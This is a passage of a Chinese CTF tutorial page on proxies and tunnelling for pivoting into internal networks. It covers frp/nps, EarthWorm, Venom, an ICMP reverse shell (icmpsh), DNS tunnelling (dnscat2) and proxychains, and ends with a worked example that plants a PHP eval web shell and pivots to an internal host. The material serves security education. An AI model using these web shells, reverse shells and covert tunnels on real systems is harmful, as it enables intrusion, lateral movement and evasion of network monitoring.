+<p>nps 的服务端自带一个 Web 管理界面（默认 8080 端口），新建客户端、添加隧道都在网页上点几下完成，不用手改配置文件，适合多人协作或隧道很多的情况。客户端 <code>npc</code> 只需要一条命令：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># 服务端启动后，在 Web 面板拿到客户端的连接命令，形如：</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>./npc<span class="w"> </span>-server<span class="o">=</span>VPS公网IP:8024<span class="w"> </span>-vkey<span class="o">=</span>面板里生成的一串密钥<span class="w"> </span>-type<span class="o">=</span>tcp
+</code></pre></div>
+<p>然后在 Web 面板里添加一条 socks5 隧道即可。与 frp 对比：<strong>frp 轻量、纯配置文件、适合单机快速部署；nps 有图形界面、管理方便，但服务端更重、面板本身就是攻击面</strong>。CTF 单机场景两者都行，挑顺手的用。</p>
+<h3 id="ewearthworm-socks5">EW（EarthWorm）：正向 socks5 的老牌工具<a class="headerlink" href="#ewearthworm-socks5" title="Permanent link">¶</a></h3>
+<p>EW 是命令行式的端口转发/代理工具，特点是 <strong>一条命令搞定，不需要配置文件</strong>，在拿到 shell 的跳板上直接跑：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># 正向模式：在跳板上开 socks5，攻击机直连（跳板有公网IP或可达时）</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>./ew<span class="w"> </span>-s<span class="w"> </span>ssocksd<span class="w"> </span>-l<span class="w"> </span><span class="m">1080</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># 反向模式一：跳板主动连攻击机的 VPS</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># 先在 VPS 上：</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>./ew<span class="w"> </span>-s<span class="w"> </span>rcsocks<span class="w"> </span>-l<span class="w"> </span><span class="m">1080</span><span class="w"> </span>-e<span class="w"> </span><span class="m">8888</span><span class="w">    </span><span class="c1"># 8888 等跳板来连，1080 给攻击机用</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># 再在跳板上：</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>./ew<span class="w"> </span>-s<span class="w"> </span>rssocks<span class="w"> </span>-d<span class="w"> </span>VPS公网IP<span class="w"> </span>-e<span class="w"> </span><span class="m">8888</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="c1"># 之后攻击机用 VPS:1080 这个 socks5 即可</span>
+</code></pre></div>
+<p>对比总结：EW 胜在简单直接、免配置；frp/nps 胜在稳定、支持加密与认证、功能全。EW 已停止更新多年，新环境（尤其是需要加密流量绕过检测时）优先 frp。</p>
+<h2 id="venom">Venom：多层代理管理工具<a class="headerlink" href="#venom" title="Permanent link">¶</a></h2>
+<p>当内网不止一层——比如 Web 服务器后面还有办公网，办公网后面还有核心网——就需要在每一层跳板之间建立多级代理，手工维护非常痛苦。Venom 就是为此设计的多层代理管理工具，用 Go 编写，支持 Linux/Windows/macOS。</p>
+<p>它的核心是 admin 端（攻击机）和 agent 端（各级跳板），通过 <code>goto</code> 命令在节点树里跳转：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># 攻击机（admin）监听</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>./admin_linux_x64<span class="w"> </span>-lport<span class="w"> </span><span class="m">9999</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># 第一层跳板（agent）回连</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>./agent_linux_x64<span class="w"> </span>-rhost<span class="w"> </span>攻击机IP<span class="w"> </span>-rport<span class="w"> </span><span class="m">9999</span>
+</code></pre></div>
+<p>在 admin 的交互终端里：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&gt;&gt;&gt; show                    # 查看已上线的节点
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>&gt;&gt;&gt; goto 1                  # 进入节点 1 的上下文
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>(node 1) &gt;&gt;&gt; listen 1080    # 让节点 1 再监听 1080，等更深层的跳板来连
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>(node 1) &gt;&gt;&gt; socks 1081     # 在攻击机本地开 1081 的 socks5，流量经节点 1 出网
+</code></pre></div>
+<p>这样第二层跳板连上节点 1 的 1080 后，再在节点 2 上 <code>socks</code>，攻击机的 socks 入口就延伸到了第二层内网。类似的工具还有 Suo5（走 HTTP 协议的 socks5，适合只能出站 HTTP 的受限环境）、Stowaway 等，思想相同：<strong>把多层跳板组织成一棵树，攻击机在树根处统一发号施令</strong>。</p>
+<h2 id="icmp">ICMP 隧道<a class="headerlink" href="#icmp" title="Permanent link">¶</a></h2>
+<h3 id="_4">原理<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p>有些网络环境防火墙放行了 ICMP（<code>ping</code> 用的协议）却拦住了 TCP/UDP 出站。ICMP 隧道就是把数据塞进 ICMP Echo 请求/应答报文的 payload 里传输——本来装的是"在吗"，现在装的是真实流量。</p>
+<h3 id="_5">适用场景与工具<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<p>适用：目标能 ping 通外部（或被外部 ping 通）但 TCP 出站被限制的环境。缺点是带宽低、特征明显（大量异常大的 ICMP 包），容易被流量审计发现。</p>
+<p>代表工具是 icmpsh：在攻击机跑 Python 端接收，在跳板上传 <code>icmpsh.exe</code> 执行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 攻击机（先关掉本机对 ICMP Echo 的自动应答，避免干扰）</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.icmp_echo_ignore_all<span class="o">=</span><span class="m">1</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>python3<span class="w"> </span>icmpsh_m.py<span class="w"> </span>攻击机IP<span class="w"> </span>跳板IP
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># 跳板（Windows）</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>icmpsh.exe<span class="w"> </span>-t<span class="w"> </span>攻击机IP
+</code></pre></div>
+<p>成功后攻击机会拿到一个 shell。DNS 出不来、TCP 出不来、但 ping 得通时，这是最后的救命稻草之一。</p>
+<h2 id="dns">DNS 隧道<a class="headerlink" href="#dns" title="Permanent link">¶</a></h2>
+<h3 id="_6">原理<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<p>几乎所有内网都允许向 DNS 服务器发查询请求，而 DNS 服务器会把解析不了的域名递归转发出去。DNS 隧道利用这一点：把数据编码进要查询的域名里，例如把 <code>hello</code> 编码后变成 <code>aGVsbG8.tunnel.example.com</code> 发出去；权威 DNS 服务器（我们自己控制的）收到查询后解出数据，再把回包塞进 TXT/CNAME 记录的应答里带回来。</p>
+<h3 id="_7">适用场景与工具<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>适用：目标只能出 53 端口（或只能做 DNS 解析）的极端受限环境，比如某些酒店/机场 Wi-Fi 认证前可以放通 DNS。缺点是速度极慢（受域名长度和 DNS 报文大小限制）、延迟高。</p>
+<p>代表工具是 dnscat2：在 VPS 上起服务端并配置好域名的 NS 记录指向 VPS，跳板执行客户端：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># VPS 服务端</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>ruby<span class="w"> </span>dnscat2.rb<span class="w"> </span>tunnel.example.com
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># 跳板客户端</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>./dnscat<span class="w"> </span>tunnel.example.com
+</code></pre></div>
+<p>连接建立后得到一个交互式命令通道，再 <code>listen</code> 做端口转发即可。选择原则：<strong>TCP 能出去就用 frp/EW，只有 ICMP 用 icmpsh，只有 DNS 用 dnscat2</strong>。</p>
+<h2 id="proxifier-proxychains">proxifier 与 proxychains：让工具走代理<a class="headerlink" href="#proxifier-proxychains" title="Permanent link">¶</a></h2>
+<p>代理搭好了，怎么让自己电脑上的 nmap、curl、浏览器都走它？靠这两个工具。</p>
+<h3 id="proxychainslinux">proxychains（Linux）<a class="headerlink" href="#proxychainslinux" title="Permanent link">¶</a></h3>
+<p>proxychains 通过劫持程序的 connect 调用，强制其流量走 socks 代理。安装后编辑 <code>/etc/proxychains.conf</code>，在文件末尾配置：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="o">[</span>ProxyList<span class="o">]</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span>
+</code></pre></div>
+<p>如果 frp 的 socks5 开在 VPS 上，就填 <code>socks5 VPS公网IP 1080</code>。之后在任何命令前加 <code>proxychains</code> 即可：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>proxychains<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.0.0.0/24<span class="w">     </span><span class="c1"># 扫描内网</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>proxychains<span class="w"> </span>curl<span class="w"> </span>http://10.0.0.5/<span class="w">        </span><span class="c1"># 访问内网 Web</span>
+</code></pre></div>
+<p>注意两点：一是 nmap 扫描要走 <code>-sT</code>（TCP connect 扫描）加 <code>-Pn</code>，因为 socks 代理不支持 SYN 半开扫描和 ping 探测；二是 <code>quiet_mode</code> 选项可以关掉每次启动时刷屏的日志。</p>
+<p><strong>串联多级代理</strong>：<code>[ProxyList]</code> 里可以写多行，流量会从上到下依次经过每一跳：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="o">[</span>ProxyList<span class="o">]</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>socks5<span class="w"> </span>VPS_IP<span class="w"> </span><span class="m">1080</span><span class="w">      </span><span class="c1"># 第一跳：进入第一层内网</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>socks5<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span><span class="m">1081</span><span class="w">    </span><span class="c1"># 第二跳：从第一层内网的某台机器再进第二层</span>
+</code></pre></div>
+<h3 id="proxifierwindowsmacos">Proxifier（Windows/macOS）<a class="headerlink" href="#proxifierwindowsmacos" title="Permanent link">¶</a></h3>
+<p>Proxifier 是图形界面版本：在 Profile → Proxy Servers 里添加 socks5 代理，在 Proxification Rules 里设定哪些程序（如 <code>firefox.exe</code>、<code>nc.exe</code>）的流量走代理、哪些直连。思路与 proxychains 一致，只是用规则代替命令行前缀。</p>
+<h2 id="_8">多层网络中的代理链原则<a class="headerlink" href="#_8" title="Permanent link">¶</a></h2>
+<p>在多层网络中串联代理时，把握三条原则：</p>
+<ol>
+<li><strong>由外向内逐层推进</strong>：每拿下一层跳板，先确认它能通下一层，再在它上面起代理，让 socks 入口跟着往里延伸。不要试图从攻击机一步跨多层。</li>
+<li><strong>每一跳都记录拓扑</strong>：哪台跳板、哪个端口、通往哪个网段，随手画下来。三层以上不画图必乱。</li>
+<li><strong>能一层不两层</strong>：代理链每多一跳，延迟、丢包、故障点就多一分。如果某台跳板本身能直达深层目标，就直接在它上面转发端口，不要机械地串联。</li>
+</ol>
+<p>具体的多层网络拓扑搭建、多层代理串联的完整演练，以及结合 Web 漏洞打穿多层内网的综合案例，参见「多层网络综合」一章。</p>
+<h2 id="_9">例题：一道典型的内网穿透题<a class="headerlink" href="#_9" title="Permanent link">¶</a></h2>
+<p>题目描述：目标 <code>http://target.ctf:8000</code> 是一个文件上传站，提示"flag 不在外网"。</p>
+<p><strong>第一步：上传 getshell。</strong> 结合「文件上传」一章的知识，题目对后缀做了黑名单过滤但漏了 <code>.phtml</code>，上传一个简单的一句话木马 <code>shell.phtml</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<p>用蚁剑/冰蝎连上，获得 Web 服务器（<code>172.16.1.10</code>）的 shell。</p>
+<p><strong>第二步：探测内网。</strong> 在 shell 里执行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ip<span class="w"> </span>a<span class="w">          </span><span class="c1"># 发现除 172.16.1.10 外还有第二张网卡或路由指向 10.0.2.0/24</span>
+</code></pre></div>
+<p>ping 和 curl 探测发现 <code>10.0.2.15:80</code> 有一个内网站点，标题提示 flag 在这里，但攻击机直接访问不通。</p>
+<p><strong>第三步：建立代理。</strong> Web 服务器可以出网（curl 能访问我们的 VPS）。在 VPS 上启动 frps（配置见上文），把 <code>frpc</code> 和 <code>frpc.toml</code>（socks5 插件配置，<code>remotePort = 1080</code>）通过蚁剑的文件管理传到跳板 <code>/tmp</code>，执行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/frpc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>/tmp/frpc<span class="w"> </span>-c<span class="w"> </span>/tmp/frpc.toml<span class="w"> </span><span class="p">&amp;</span>
+</code></pre></div>
+<p>frps 日志显示 <code>socks5 proxy listen on 1080</code>，通道建立。</p>
+<p><strong>第四步：挂代理访问内网。</strong> 攻击机配置 proxychains 指向 <code>socks5 VPS公网IP 1080</code>，然后：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>proxychains<span class="w"> </span>curl<span class="w"> </span>http://10.0.2.15/
+</code></pre></div>
+<p>页面返回一个登录框，结合源码泄露（<code>/.git/</code> 未删除，参见「敏感信息泄露」）拿到账号密码，登录后在 <code>/flag.php</code> 页面得到 flag。</p>
+<p><strong>复盘</strong>：这道题就是"Web 漏洞入口 + 代理穿透"的典型组合——单点的 Web 漏洞（文件上传、敏感信息泄露）负责拿下跳板，代理与隧道负责把战果延伸到内网。这也是 CTF 内网题的标准套路。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../internal_recon/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 内网信息收集"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        内网信息收集
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../three_layer/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 三层网络实战"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        三层网络实战
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#_1">代理与隧道</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">正向代理与反向代理</a>
+        
+      </li>
+    
+      <li>
+        <a href="#frp">frp：最常用的内网穿透工具</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_3">服务端配置</a>
+        
+      </li>
+    
+      <li>
+        <a href="#tcp">客户端配置（转发单个 TCP 端口）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#socks5">socks5 插件（访问整个内网）</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#nps-ew">nps 与 EW：另两个常用选手</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#nps-web-frp">nps：带 Web 管理面板的 frp</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ewearthworm-socks5">EW（EarthWorm）：正向 socks5 的老牌工具</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#venom">Venom：多层代理管理工具</a>
+        
+      </li>
+    
+      <li>
+        <a href="#icmp">ICMP 隧道</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">原理</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">适用场景与工具</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#dns">DNS 隧道</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_6">原理</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">适用场景与工具</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#proxifier-proxychains">proxifier 与 proxychains：让工具走代理</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#proxychainslinux">proxychains（Linux）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#proxifierwindowsmacos">Proxifier（Windows/macOS）</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_8">多层网络中的代理链原则</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_9">例题：一道典型的内网穿透题</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
